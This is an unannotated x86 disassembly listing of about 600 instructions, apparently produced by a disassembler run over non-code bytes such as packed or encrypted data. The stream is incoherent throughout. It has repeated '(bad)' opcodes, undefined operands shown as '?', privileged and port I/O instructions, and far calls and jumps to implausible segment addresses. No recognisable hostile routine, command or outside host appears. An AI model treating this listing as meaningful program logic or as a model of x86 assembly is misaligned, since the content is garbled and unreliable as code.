  416288:	jnp    0x4162c4
  41628a:	test   eax,0xa4333830
  41628f:	sbb    BYTE PTR [ebx-0x7db06f74],bh
  416295:	fldcw  WORD PTR [edx+0x79]
  416298:	and    esp,DWORD PTR cs:0xcf324b57
  41629f:	mov    al,0x9b
  4162a1:	inc    edi
  4162a2:	pop    ecx
  4162a3:	aam    0xa0
  4162a5:	jle    0x416279
  4162a7:	mov    ecx,0xe3c8ef3b
  4162ac:	fwait
  4162ad:	cmp    al,0x1e
  4162af:	daa    
  4162b0:	das    
  4162b1:	jo     0x4162dc
  4162b3:	xchg   edi,eax
  4162b4:	aas    
  4162b5:	adc    bl,dl
  4162b7:	loopne 0x416282
  4162b9:	mov    ebp,eax
  4162bb:	mov    cl,0xa8
  4162bd:	adc    al,0xf8
  4162bf:	sub    bl,BYTE PTR [ebp-0x2291a70]
  4162c5:	push   edi
  4162c6:	retf   0xbaf4
  4162c9:	(bad)  
  4162ca:	cmp    BYTE PTR [ecx+eiz*8+0x74],bl
  4162ce:	enter  0x81ff,0x13
  4162d2:	inc    edx
  4162d3:	xchg   ecx,eax
  4162d4:	adc    edx,ebp
  4162d6:	ins    BYTE PTR es:[edi],dx
  4162d7:	aaa    
  4162d8:	stos   DWORD PTR es:[edi],eax
  4162d9:	or     DWORD PTR [ebx+0x7e],ebp
  4162dc:	sbb    al,0x53
  4162de:	xchg   esi,eax
  4162df:	bound  ebp,QWORD PTR [ebp+0x265610a1]
  4162e5:	push   edi
  4162e6:	jp     0x41632d
  4162e8:	addr16 mov esi,0xdd98da23
  4162ee:	mov    al,BYTE PTR ds:0xd13e14bc
  4162f4:	mov    eax,ds:0x9a1feca
  4162f9:	mov    eax,ds:0xcb710d6e
  4162fe:	and    al,0xb7
  416300:	mov    eax,ds:0xe3086c1e
  416305:	addr16 dec edi
  416307:	push   cs
  416308:	clc    
  416309:	popa   
  41630a:	push   es
  41630b:	scas   eax,DWORD PTR es:[edi]
  41630c:	js     0x4162f9
  41630e:	and    al,0x1e
  416310:	ss cmp al,0xcf
  416313:	pop    ss
  416314:	xchg   ebp,eax
  416315:	out    dx,al
  416316:	mov    al,ds:0x9d2a4655
  41631b:	cmc    
  41631c:	arpl   sp,si
  41631e:	stos   DWORD PTR es:[edi],eax
  41631f:	int3   
  416320:	fist   WORD PTR [esp+esi*1+0x2848f578]
  416327:	js     0x416389
  416329:	sub    eax,0x5d3b9b35
  41632e:	sahf   
  41632f:	call   0xda6479a5
  416334:	dec    bp
  416336:	jb     0x4162e6
  416338:	pop    ebp
  416339:	push   0xffffff98
  41633b:	rcr    BYTE PTR [edx-0x48],1
  41633e:	push   ebp
  41633f:	addr16 sub al,0x81
  416342:	and    DWORD PTR [ebp+0x4b],ebx
  416345:	xchg   edx,eax
  416346:	and    al,0x68
  416348:	js     0x4162d4
  41634a:	out    0xff,eax
  41634c:	cmp    DWORD PTR [ecx+eax*8-0x64],0xf08c231
  416354:	into   
  416355:	outs   dx,BYTE PTR ds:[esi]
  416356:	adc    al,0x75
  416358:	repz xchg esp,eax
  41635a:	mov    bh,0xaa
  41635c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41635d:	or     ebp,DWORD PTR [ecx*8+0xfbc241b]
  416364:	test   BYTE PTR [ebx+0x5d],bl
  416367:	xchg   BYTE PTR [ecx+ebp*2],ah
  41636a:	int3   
  41636b:	pop    ds
  41636c:	adc    ebp,edx
  41636e:	inc    ebx
  41636f:	dec    eax
  416370:	in     eax,0x51
  416372:	in     eax,0xf0
  416374:	leave  
  416375:	mov    gs,WORD PTR [eax+ebx*4]
  416378:	pop    ss
  416379:	sti    
  41637a:	cwde   
  41637b:	test   eax,0x8eff2dff
  416380:	mov    eax,0x1fc9c2aa
  416385:	pop    esp
  416386:	jp     0x416320
  416388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416389:	or     al,0x27
  41638b:	and    eax,0xf3a952f2
  416390:	mov    esi,0x2d3eb4ac
  416395:	pop    esi
  416396:	scas   eax,DWORD PTR es:[edi]
  416397:	jno    0x41640c
  416399:	jmp    0x9003:0x6a01d34a
  4163a0:	and    DWORD PTR [ebx+0x3],0xffffff8a
  4163a4:	je     0x4163b1
  4163a6:	sub    ecx,eax
  4163a8:	or     bh,cl
  4163aa:	sub    ebx,DWORD PTR [ecx+0x23]
  4163ad:	mov    edi,es
  4163af:	pop    edi
  4163b0:	fisub  WORD PTR [ecx]
  4163b2:	call   0x4083:0x92a7b23d
  4163b9:	cmp    cl,bh
  4163bb:	ret    
  4163bc:	or     eax,0x23353ba1
  4163c1:	cmp    edi,DWORD PTR [eax-0x68]
  4163c4:	sbb    al,0x1
  4163c6:	lds    ecx,FWORD PTR [ebp-0x64]
  4163c9:	hlt    
  4163ca:	(bad)  
  4163cb:	out    dx,al
  4163cc:	loopne 0x416432
  4163ce:	daa    
  4163cf:	retf   0x6f61
  4163d2:	xchg   BYTE PTR [ebx+0x15],al
  4163d5:	mov    al,0xbf
  4163d7:	(bad)  
  4163d8:	jae    0x4163ca
  4163da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163db:	mov    ch,0x5
  4163dd:	lock sbb BYTE PTR [edx-0x25d7c46f],ch
  4163e4:	inc    edi
  4163e5:	push   0xe2a952eb
  4163ea:	test   eax,0x6bb07e52
  4163ef:	mov    edi,0x3436223d
  4163f4:	sbb    cl,BYTE PTR [edx-0x54]
  4163f7:	ss out dx,eax
  4163f9:	mov    ebp,0x1a549df5
  4163fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163ff:	es push ebp
  416401:	mov    dl,BYTE PTR [edx+0x3a]
  416404:	cwde   
  416405:	xchg   DWORD PTR [eax-0x29],esi
  416408:	sbb    edx,DWORD PTR [eax-0x2d3a4844]
  41640e:	jnp    0x416421
  416410:	push   ss
  416411:	pop    ebp
  416412:	in     al,dx
  416413:	and    esi,DWORD PTR [ebx]
  416415:	push   0x1e
  416417:	mov    eax,0x885f3533
  41641c:	xor    BYTE PTR [ebx],ah
  41641e:	jmp    DWORD PTR [edx-0x4bcc79cb]
  416424:	fldcw  WORD PTR [eax]
  416426:	and    eax,0xbf48e49c
  41642b:	xchg   ecx,eax
  41642c:	and    ah,dl
  41642e:	ins    BYTE PTR es:[edi],dx
  41642f:	push   esp
  416430:	sub    eax,0x74e1d1a9
  416435:	popa   
  416436:	xor    ebp,edx
  416438:	xchg   esp,eax
  416439:	xor    dl,bh
  41643b:	test   BYTE PTR [ecx-0x6df185f3],ch
  416441:	push   ebp
  416442:	push   eax
  416443:	xchg   ebx,eax
  416444:	aad    0x2f
  416446:	and    BYTE PTR [edx-0x25b76655],dh
  41644c:	pop    ss
  41644d:	sti    
  41644e:	dec    edx
  41644f:	(bad)  [edx]
  416451:	push   edx
  416452:	jl     0x4164ad
  416454:	xor    DWORD PTR [esi],esi
  416456:	mov    ds:0xec7a6fcc,al
  41645b:	je     0x41642e
  41645d:	push   0x9d048e66
  416462:	xchg   esi,eax
  416463:	mov    ah,0x2d
  416465:	xchg   BYTE PTR [ebx-0x3a],cl
  416468:	xlat   BYTE PTR ds:[ebx]
  416469:	aaa    
  41646a:	dec    esp
  41646b:	jbe    0x416460
  41646d:	xchg   edx,eax
  41646e:	popf   
  41646f:	push   es
  416470:	cmp    DWORD PTR [edi-0x22],0x95745091
  416477:	adc    ah,BYTE PTR [ebp-0x50094ac6]
  41647d:	jle    0x416445
  41647f:	jno    0x4164a6
  416481:	loop   0x41648e
  416483:	mov    ss:0x3e645e4b,eax
  416489:	mov    al,ds:0xa1ecda25
  41648e:	lods   al,BYTE PTR ds:[esi]
  41648f:	and    edi,DWORD PTR ds:0x5c6116d3
  416495:	mov    ds:0xea88889c,eax
  41649a:	sbb    ecx,0xa705d3be
  4164a0:	jbe    0x41647b
  4164a2:	pop    eax
  4164a3:	dec    eax
  4164a5:	or     esp,DWORD PTR [eax]
  4164a7:	or     edx,eax
  4164a9:	sub    esi,ebx
  4164ab:	hlt    
  4164ac:	or     eax,0x1d0f10c9
  4164b1:	icebp  
  4164b2:	push   ss
  4164b3:	fwait
  4164b4:	push   ebx
  4164b5:	adc    ah,BYTE PTR [edi]
  4164b7:	add    DWORD PTR [ebx+ebx*8],edx
  4164ba:	and    BYTE PTR [ecx+0x53],dh
  4164bd:	mov    ebp,0x95219a90
  4164c2:	push   ebx
  4164c3:	dec    edx
  4164c4:	adc    al,0x2
  4164c6:	popa   
  4164c7:	call   0x8929:0x2454f6f4
  4164ce:	icebp  
  4164cf:	jb     0x416539
  4164d1:	iret   
  4164d2:	push   eax
  4164d3:	push   ebx
  4164d4:	js     0x4164bb
  4164d6:	out    0x2a,eax
  4164d8:	xchg   esp,eax
  4164d9:	jl     0x4164bf
  4164db:	pop    esi
  4164dc:	cmp    esp,DWORD PTR [ecx-0x8]
  4164df:	cld    
  4164e0:	lods   eax,DWORD PTR ds:[esi]
  4164e1:	out    dx,al
  4164e2:	imul   esp,DWORD PTR [ecx],0x4032a1f4
  4164e8:	cmp    al,0x6e
  4164ea:	fcom   QWORD PTR [ecx]
  4164ec:	add    BYTE PTR [edi],bl
  4164ee:	inc    ecx
  4164ef:	mov    eax,0xd3b3e468
  4164f4:	in     eax,dx
  4164f5:	push   0x4e5f0960
  4164fa:	sub    edx,DWORD PTR [eax+0x55349b94]
  416500:	fst    DWORD PTR [ebx-0x7ed75322]
  416506:	add    edx,DWORD PTR [edx]
  416508:	adc    ebp,DWORD PTR [edi-0x737cd45f]
  41650e:	cmp    ebp,edi
  416510:	jmp    FWORD PTR es:[esi+0x1583a932]
  416517:	sbb    eax,0xabf2b3a2
  41651c:	sbb    ch,ah
  41651e:	inc    esi
  41651f:	xchg   esi,eax
  416520:	sbb    al,0x26
  416522:	cmp    eax,0xfbd3644
  416527:	inc    esp
  416528:	or     bh,BYTE PTR gs:[ebp-0x58035ec]
  41652f:	hlt    
  416530:	xor    bl,ah
  416532:	(bad)  
  416533:	adc    esp,DWORD PTR [ecx]
  416535:	ins    BYTE PTR es:[edi],dx
  416536:	xor    eax,0xbcd6f751
  41653b:	push   cs
  41653c:	mov    WORD PTR ds:0xb35ae961,ss
  416542:	mov    ecx,0xe0ef973b
  416547:	push   ebx
  416548:	xlat   BYTE PTR ds:[ebx]
  416549:	pop    ebx
  41654a:	sub    edi,DWORD PTR [eax+eax*1-0x2]
  41654e:	arpl   WORD PTR [edi+0x7d09efc],si
  416554:	shl    DWORD PTR [edx+0x55],cl
  416557:	jg     0x416576
  416559:	mov    ch,0xfd
  41655b:	test   BYTE PTR [ebp-0x442cc5f6],bh
  416561:	mov    WORD PTR [edi+0x535e2846],?
  416567:	sub    DWORD PTR [ecx],ebx
  416569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41656a:	xchg   edi,eax
  41656b:	jae    0x416555
  41656d:	outs   dx,DWORD PTR ds:[esi]
  41656e:	mov    esi,0xca56fe39
  416573:	gs (bad) 
  416575:	lds    edx,FWORD PTR [eax]
  416577:	outs   dx,DWORD PTR ds:[esi]
  416578:	icebp  
  416579:	outs   dx,DWORD PTR gs:[esi]
  41657b:	lods   eax,DWORD PTR ds:[esi]
  41657c:	jl     0x41651d
  41657e:	pop    ds
  41657f:	adc    BYTE PTR [edx+0x18],cl
  416582:	call   0x16de:0x41c4d8ef
  416589:	pop    ebp
  41658a:	xchg   edi,eax
  41658b:	clc    
  41658c:	test   al,0x9a
  41658e:	or     eax,0xf8469ad8
  416593:	stc    
  416594:	mov    esi,0x99081fc2
  416599:	pop    eax
  41659b:	pop    esi
  41659c:	push   ebx
  41659d:	xchg   edx,eax
  41659e:	cmp    edx,DWORD PTR [esp+ebp*4+0x3152f2fb]
  4165a5:	test   DWORD PTR [esi],esp
  4165a7:	pop    esp
  4165a8:	ja     0x4165b4
  4165aa:	in     eax,0xfc
  4165ac:	lea    ebx,[ebp-0x2e38fc13]
  4165b2:	ret    0x7083
  4165b5:	fdiv   st(0),st
  4165b7:	and    edi,DWORD PTR [edx]
  4165b9:	or     DWORD PTR [edi+0x3b],edi
  4165bc:	(bad)
  4165bf:	into   
  4165c0:	aad    0xb
  4165c2:	xor    DWORD PTR [ebx+0x77],esi
  4165c5:	outs   dx,BYTE PTR gs:[esi]
  4165c7:	push   0xffffff95
  4165c9:	dec    esp
  4165ca:	push   ebx
  4165cb:	jmp    0x416566
  4165cd:	mov    eax,0x3d83497c
  4165d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d3:	xlat   BYTE PTR ds:[ebx]
  4165d4:	cli    
  4165d5:	jle    0x416649
  4165d7:	or     esi,0xdd6bf935
  4165dd:	push   edx
  4165de:	je     0x41662d
  4165e0:	(bad)  
  4165e1:	out    0xac,eax
  4165e3:	or     al,0xe6
  4165e5:	sbb    eax,0xf932aee4
  4165ea:	mov    WORD PTR [ebp+0x34e2246f],?
  4165f0:	aam    0xe0
  4165f2:	mov    bl,ah
  4165f4:	cmp    BYTE PTR [eax],dl
  4165f6:	sbb    ah,cl
  4165f8:	mov    edi,0x6d3cc11e
  4165fd:	aam    0xeb
  4165ff:	gs xchg edx,eax
  416601:	inc    eax
  416602:	call   0xcf5c:0x80c95fb2
  416609:	jno    0x416604
  41660b:	or     edx,DWORD PTR [ebx-0x63198aec]
  416611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416612:	dec    ebx
  416613:	mov    ebx,0x5bf061eb
  416618:	xchg   edi,eax
  416619:	outs   dx,BYTE PTR ds:[esi]
  41661a:	push   ebp
  41661b:	adc    eax,0x4748e000
  416620:	pop    ds
  416621:	ror    DWORD PTR [esi],1
  416623:	cmp    eax,0x76f9ef12
  416628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416629:	xor    BYTE PTR [esi],dh
  41662b:	xor    ecx,DWORD PTR [edx-0x762d27d4]
  416631:	mov    esi,0xd920051b
  416636:	xchg   esi,eax
  416637:	adc    edx,edi
  416639:	jno    0x41661e
  41663b:	add    al,0x4b
  41663d:	cmp    ebp,DWORD PTR [edi]
  41663f:	int3   
  416640:	out    dx,eax
  416641:	and    al,BYTE PTR [edi]
  416643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416644:	cli    
  416645:	mov    ebp,DWORD PTR [eax+0x72]
  416648:	push   edi
  416649:	jns    0x41663e
  41664b:	es ret 0xc8c9
  41664f:	sub    DWORD PTR [esi-0x44],eax
  416652:	add    BYTE PTR ds:[ebp+0x52bd3e0a],al
  416659:	sbb    eax,0xc55f58b3
  41665e:	idiv   edi
  416660:	mov    ah,BYTE PTR [edi-0x60286e7c]
  416666:	lods   al,BYTE PTR ds:[esi]
  416667:	xor    eax,0xb8562ad4
  41666c:	push   ebx
  41666d:	(bad)  
  41666e:	aam    0xae
  416670:	mov    al,0xe7
  416672:	ss dec esi
  416674:	retf   0xd436
  416677:	jecxz  0x41668f
  416679:	push   ebp
  41667a:	aad    0xe0
  41667c:	fimul  WORD PTR [edx-0x2e]
  41667f:	call   0xcd28ef2a
  416684:	xchg   BYTE PTR [edx+0x64],al
  416687:	push   cs
  416688:	in     eax,0xe9
  41668a:	xchg   ebx,eax
  41668b:	inc    esi
  41668c:	lahf   
  41668d:	mov    ah,0x8c
  41668f:	ror    DWORD PTR [eax],cl
  416691:	(bad)  
  416692:	repz cmp BYTE PTR [edx+0x43b8fe82],ch
  416699:	popf   
  41669a:	test   eax,0xc4485d2a
  41669f:	jmp    0x4166c3
  4166a1:	mov    eax,ds:0x3ad4dc48
  4166a6:	xor    BYTE PTR [edi+0x3232eed5],bh
  4166ac:	call   0x1c15:0xf50a0fc1
  4166b3:	sar    dl,1
  4166b5:	sahf   
  4166b6:	mov    ebp,0x462e411f
  4166bb:	enter  0x93d2,0x5c
  4166bf:	enter  0xf6da,0xec
  4166c3:	aaa    
  4166c4:	sbb    eax,0x69b99971
  4166c9:	ja     0x4166ad
  4166cb:	(bad)  
  4166cc:	jmp    0x416682
  4166ce:	fisub  DWORD PTR [esi-0x14]
  4166d1:	xchg   BYTE PTR [ecx+eax*1+0x19e12516],bl
  4166d8:	rcr    dh,cl
  4166da:	xchg   ebp,eax
  4166db:	or     dl,dl
  4166dd:	(bad)  
  4166de:	mov    ecx,0xa8a19e01
  4166e3:	mov    DWORD PTR ds:0xbeacd4d7,esp
  4166e9:	ss pushf 
  4166eb:	int3   
  4166ec:	les    ecx,FWORD PTR [ebx]
  4166ee:	dec    esi
  4166ef:	push   0x8b8ce07
  4166f4:	hlt    
  4166f5:	sbb    al,BYTE PTR [edi+0x13]
  4166f8:	(bad)  
  4166f9:	xlat   BYTE PTR ds:[ebx]
  4166fa:	arpl   WORD PTR [ebx+0x21],sp
  4166fd:	mov    dl,0x79
  4166ff:	cmp    al,0x66
  416701:	inc    esp
  416702:	nop
  416703:	retf   0x8f9a
  416706:	jl     0x4166f6
  416708:	or     al,0xa6
  41670a:	jns    0x416777
  41670c:	and    BYTE PTR [ebp-0x15406ce5],dl
  416712:	ds cs clc 
  416715:	repz test WORD PTR [ecx+0x134d8419],di
  41671d:	imul   edx,DWORD PTR [ebx],0x31b3f063
  416723:	xchg   esi,eax
  416724:	ror    DWORD PTR [ebx+0x27],cl
  416727:	not    DWORD PTR [edx+0xb]
  41672a:	fdivr  DWORD PTR [esi+0xa]
  41672d:	dec    edi
  41672e:	inc    edi
  41672f:	js     0x416703
  416731:	dec    eax
  416732:	imul   esi,DWORD PTR [eax+edi*8-0x5c],0xfffffffc
  416737:	test   al,0x5a
  416739:	jo     0x416709
  41673b:	mov    esp,0x6f422aac
  416740:	or     edi,DWORD PTR [esi]
  416742:	cmovge edx,edi
  416745:	adc    DWORD PTR [eax-0x19757a5a],esi
  41674b:	stos   BYTE PTR es:[edi],al
  41674c:	out    0x6d,al
  41674e:	sbb    dl,BYTE PTR [edx+0xb6900cb]
  416754:	and    DWORD PTR [eax+0x8],ebp
  416757:	push   ebp
  416758:	in     eax,dx
  416759:	mov    bl,0x84
  41675b:	pop    es
  41675c:	jle    0x416742
  41675e:	xchg   esi,eax
  41675f:	and    eax,0xaa1e5ceb
  416764:	jnp    0x4167b4
  416766:	aam    0x28
  416768:	sbb    DWORD PTR [ebx+0x5f],ebp
  41676b:	and    DWORD PTR [ebp-0x3a],esi
  41676e:	popa   
  41676f:	call   0xb5fa:0x779c24b3
  416776:	add    bl,BYTE PTR [edx]
  416778:	ror    BYTE PTR [ecx],0x84
  41677b:	out    dx,al
  41677c:	imul   eax,DWORD PTR [edi+0x28],0x8a47dae7
  416783:	xchg   DWORD PTR ds:0x9b30f6e1,ebp
  416789:	rcr    BYTE PTR [ebx],cl
  41678b:	ficomp DWORD PTR [bp+0x28d]
  416790:	test   BYTE PTR [ebx+0x24],0xc2
  416794:	fsub   st(7),st
  416796:	xlat   BYTE PTR ds:[ebx]
  416797:	jbe    0x416794
  416799:	jne    0x4167dd
  41679b:	ror    BYTE PTR [esi],cl
  41679d:	out    dx,eax
  41679e:	inc    ebx
  41679f:	pop    edi
  4167a0:	sub    dh,BYTE PTR ds:0x499d34d2
  4167a6:	bound  ebp,QWORD PTR [edx]
  4167a8:	xor    DWORD PTR [esi+0x71],ebp
  4167ab:	cwde   
  4167ac:	cwde   
  4167ad:	retf   
  4167ae:	pop    eax
  4167af:	sub    al,BYTE PTR ds:0x5d09b064
  4167b5:	ret    
  4167b6:	dec    edx
  4167b7:	shl    BYTE PTR ds:0x482f984a,1
  4167bd:	fwait
  4167be:	jmp    0x9c090bb3
  4167c3:	push   edx
  4167c4:	jmp    0x129:0x43ffa65b
  4167cb:	ds mov esi,edx
  4167ce:	xor    eax,0xf780d4fc
  4167d3:	adc    ebp,ebp
  4167d5:	sub    eax,0x9f1243f0
  4167da:	cdq    
  4167db:	cmc    
  4167dc:	sub    ch,cl
  4167de:	lds    eax,FWORD PTR [eax-0xe5e718a]
  4167e4:	int3   
  4167e5:	push   edx
  4167e6:	int    0x41
  4167e8:	call   0x16bd3d9d
  4167ed:	fldcw  WORD PTR [ecx]
  4167ef:	xor    al,0xb1
  4167f1:	stos   DWORD PTR es:[edi],eax
  4167f2:	into   
  4167f3:	dec    esp
  4167f4:	ret    
  4167f5:	cmp    eax,0xccea480c
  4167fa:	xor    DWORD PTR [edx-0x4934d3c1],esp
  416800:	pop    edx
  416801:	dec    edx
  416802:	cld    
  416803:	push   ebp
  416804:	ficomp WORD PTR [ecx+ecx*4]
  416807:	sbb    BYTE PTR [eax+0x539004e2],ch
  41680d:	push   0xfffffffd
  41680f:	rcr    BYTE PTR [ebp+0x2d15adc4],cl
  416815:	sub    eax,0x4a8480b7
  41681a:	xor    cl,BYTE PTR [ebx-0x29]
  41681d:	js     0x416890
  41681f:	fild   WORD PTR [edi+0x2d68387b]
  416825:	fucomi st,st(3)
  416827:	out    dx,al
  416828:	and    esi,DWORD PTR [ecx]
  41682a:	xchg   BYTE PTR [eax],bh
  41682c:	mov    esp,0x2b5f6f4
  416831:	push   es
  416832:	imul   edi,DWORD PTR [eax-0x50bbd77f],0xe4fa3bc
  41683c:	pop    esp
  41683d:	fadd   QWORD PTR [ebp-0x28c41644]
  416843:	ret    0x4c9a
  416846:	adc    edi,esi
  416848:	cld    
  416849:	stos   DWORD PTR es:[edi],eax
  41684a:	pop    ebx
  41684b:	mov    al,0xc6
  41684d:	lock repz jno 0x416867
  416851:	out    0x8b,eax
  416853:	dec    ecx
  416854:	icebp  
  416855:	in     eax,0xaf
  416857:	lea    ebp,[esi-0x68]
  41685a:	dec    ebp
  41685b:	xor    al,0xac
  41685d:	mov    ds:0x46ffc44b,eax
  416862:	jbe    0x416809
  416864:	daa    
  416865:	pop    edi
  416866:	imul   eax,DWORD PTR [edx-0x57],0x6e
  41686a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41686b:	fcmovu st,st(1)
  41686d:	jae    0x4168e9
  41686f:	jae    0x41685c
  416871:	jo     0x416807
  416873:	lock test ebx,0x3a1754c5
  41687a:	xchg   ebp,eax
  41687b:	loope  0x416895
  41687d:	adc    BYTE PTR [ebp+0x11],bh
  416880:	inc    ebx
  416881:	mov    ecx,0x17921b7e
  416886:	popf   
  416887:	out    0x8c,al
  416889:	out    0x67,al
  41688b:	adc    ecx,DWORD PTR [esp+ebp*4]
  41688e:	add    cl,al
  416890:	sub    BYTE PTR [ebp-0x78],bh
  416893:	bound  eax,QWORD PTR [edi+0x36a9752c]
  416899:	pop    ebx
  41689a:	shl    BYTE PTR [ebx],cl
  41689c:	add    DWORD PTR [edx+eax*4-0xd],0x4f7519c9
  4168a4:	aaa    
  4168a5:	or     edx,ebp
  4168a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168a9:	pop    esi
  4168aa:	jle    0x4168dd
  4168ac:	je     0x416915
  4168ae:	sti    
  4168af:	mov    esp,0xd1a13e70
  4168b4:	mov    al,ds:0xd3a776e
  4168b9:	add    esp,DWORD PTR [ebp+0x7d20f3]
  4168bf:	repz dec edx
  4168c1:	ret    0xe334
  4168c4:	mov    esi,0x35909b12
  4168c9:	icebp  
  4168ca:	ss fwait
  4168cc:	mov    eax,0xb78a6c91
  4168d1:	push   ds
  4168d2:	ins    DWORD PTR es:[edi],dx
  4168d3:	xor    ecx,ebx
  4168d5:	push   edx
  4168d6:	out    0x6b,al
  4168d8:	cmp    DWORD PTR [edi],ecx
  4168da:	fadd   DWORD PTR [ebx-0x17]
  4168dd:	mov    ?,WORD PTR [eax+0xf8e52ea]
  4168e3:	jmp    0x4168ad
  4168e5:	adc    eax,0xec9a80a7
  4168ea:	in     al,dx
  4168eb:	and    al,0x47
  4168ed:	mov    al,ds:0x9e7c5038
  4168f2:	jl     0x41692c
  4168f4:	into   
  4168f5:	and    eax,0xd648e01a
  4168fa:	ret    0xf22e
  4168fd:	rcl    dl,1
  4168ff:	xor    DWORD PTR [edi+0x4e365682],ebx
  416905:	sbb    esi,ebp
  416907:	push   eax
  416908:	xor    al,BYTE PTR [esp+edi*4]
  41690b:	sbb    eax,0x1d76f1f8
  416910:	(bad)  
  416911:	mov    ecx,0x9e79608
  416916:	dec    edx
  416917:	jg     0x416979
  416919:	das    
  41691a:	pushf  
  41691b:	int    0xcc
  41691d:	fsubrp st(6),st
  41691f:	stos   BYTE PTR es:[edi],al
  416920:	mov    edi,0xc9df8ccc
  416925:	mov    eax,0xabaaa656
  41692a:	jge    0x416903
  41692c:	xchg   esp,eax
  41692d:	(bad)  
  41692e:	popf   
  41692f:	inc    esi
  416930:	lods   al,BYTE PTR ds:[esi]
  416931:	cwde   
  416932:	les    edi,FWORD PTR [edi]
  416934:	mov    cl,0x87
  416936:	and    BYTE PTR [edx],dl
  416938:	in     eax,dx
  416939:	and    eax,0xbfb53465
  41693e:	mov    esp,0x4aafe347
  416943:	sub    bl,ah
  416945:	sbb    eax,0xd4a60bbd
  41694a:	inc    edi
  41694b:	push   ecx
  41694c:	stos   DWORD PTR es:[edi],eax
  41694d:	push   0xa9b4e339
  416952:	mov    al,0xdf
  416954:	imul   edx,DWORD PTR [esi],0x57815d23
  41695a:	enter  0x4107,0x6f
  41695e:	mov    cl,0x7e
  416960:	or     eax,0xc5a88e6a
  416965:	mov    ah,0xe8
  416967:	lea    esi,[edi]
  416969:	jae    0x416969
  41696b:	mov    ah,0xd2
  41696d:	pop    es
  41696e:	jl     0x4169b5
  416970:	mov    bl,0xb6
  416972:	mov    ecx,0x8c1fe6d0
  416977:	cwde   
  416978:	mov    edi,0xae04f8ea
  41697d:	daa    
  41697e:	dec    ebp
  41697f:	ins    DWORD PTR es:[edi],dx
  416980:	and    dl,BYTE PTR [ecx+0x48]
  416983:	stos   DWORD PTR es:[edi],eax
  416984:	jmp    0x4169b0
  416986:	cmp    esi,DWORD PTR [ebx]
  416988:	(bad)  
  416989:	fiadd  DWORD PTR [edx+edx*1-0xd]
  41698d:	loop   0x4169be
  41698f:	sub    ebx,DWORD PTR [ecx-0x33]
  416992:	(bad)  
  416993:	je     0x416974
  416995:	lods   al,BYTE PTR ds:[esi]
  416996:	popf   
  416997:	mov    cl,0x6a
  416999:	xlat   BYTE PTR ds:[ebx]
  41699a:	outs   dx,BYTE PTR ds:[esi]
  41699b:	cmp    bh,BYTE PTR [edx]
  41699d:	pusha  
  41699e:	outs   dx,DWORD PTR ds:[esi]
  41699f:	lea    ecx,[esi-0x79830b43]
  4169a5:	adc    al,0x23
  4169a7:	loopne 0x416983
  4169a9:	xchg   esp,eax
  4169aa:	jbe    0x41696b
  4169ac:	mov    eax,0xb7e01077
  4169b1:	adc    eax,0xad1ae124
  4169b6:	into   
  4169b7:	jno    0x4169e8
  4169b9:	xor    al,0x20
  4169bb:	jb     0x4169e2
  4169bd:	pop    ebx
  4169be:	lea    edi,[eax+0x70]
  4169c1:	push   ss
  4169c2:	pop    esi
  4169c3:	dec    ebx
  4169c4:	xchg   edi,eax
  4169c5:	(bad)  
  4169c6:	loopne 0x416a0e
  4169c8:	pop    eax
  4169c9:	mov    bl,0x5
  4169cb:	inc    edi
  4169cc:	fisttp DWORD PTR [edx+0x3a]
  4169cf:	jne    0x4169a9
  4169d1:	sbb    eax,DWORD PTR [edi-0x4e9a30bb]
  4169d7:	sbb    eax,0xe961c423
  4169dc:	aaa    
  4169dd:	fdivp  st(1),st
  4169df:	not    DWORD PTR [edx-0x34]
  4169e2:	mov    esi,0x4fa7e0cb
  4169e7:	add    eax,0x31541ced
  4169ec:	push   0xb1653e29
  4169f1:	mov    edi,0xdc80a31d
  4169f6:	mov    ebx,0xd0e56459
  4169fb:	mov    WORD PTR [ecx+0x1da0a94b],?
  416a01:	or     BYTE PTR [edx-0x3fc48d6d],ch
  416a07:	pop    ebx
  416a08:	and    eax,0x49713f1
  416a0d:	pop    eax
  416a0e:	push   0x6c
  416a10:	loope  0x4169c9
  416a12:	pop    edi
  416a13:	mov    cl,0x33
  416a15:	je     0x416a76
  416a17:	sahf   
  416a18:	call   0x3c756e44
  416a1d:	push   edi
  416a1e:	inc    ecx
  416a1f:	inc    ebx
  416a20:	push   ebx
  416a21:	hlt    
  416a22:	inc    ebp
  416a23:	je     0x416a11
  416a25:	or     BYTE PTR [edx],ch
  416a27:	fimul  DWORD PTR ds:0x2991dc0
  416a2d:	dec    ecx
  416a2e:	imul   ebx,DWORD PTR [ecx-0x2406a7e0],0xffffffff
  416a35:	mov    al,0xab
  416a37:	js     0x4169c6
  416a39:	ficomp DWORD PTR [ecx]
  416a3b:	test   al,0x9f
  416a3d:	jae    0x416a9d
  416a3f:	ret    
  416a40:	jle    0x416ab1
  416a42:	xchg   edx,eax
  416a43:	push   ecx
  416a44:	cs nop
  416a46:	jge    0x416a8b
  416a48:	ins    BYTE PTR es:[edi],dx
  416a49:	jnp    0x416a3c
  416a4b:	ret    0x67e6
  416a4e:	jae    0x416a2e
  416a50:	clc    
  416a51:	call   0xf1fe:0x8954442e
  416a58:	mov    ds:0xa0f4626d,eax
  416a5d:	add    ebx,DWORD PTR [edi-0x6a]
  416a60:	scas   eax,DWORD PTR es:[edi]
  416a61:	mov    es,edi
  416a63:	inc    eax
  416a64:	mov    ss:0xd824f171,al
  416a6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a6b:	out    0x6f,al
  416a6d:	dec    edi
  416a6e:	sbb    BYTE PTR [bp+si-0x5534],ah
  416a73:	scas   al,BYTE PTR es:[edi]
  416a74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a75:	cdq    
  416a76:	(bad)  
  416a77:	mov    ch,0xce
  416a79:	push   ebx
  416a7a:	stos   BYTE PTR es:[edi],al
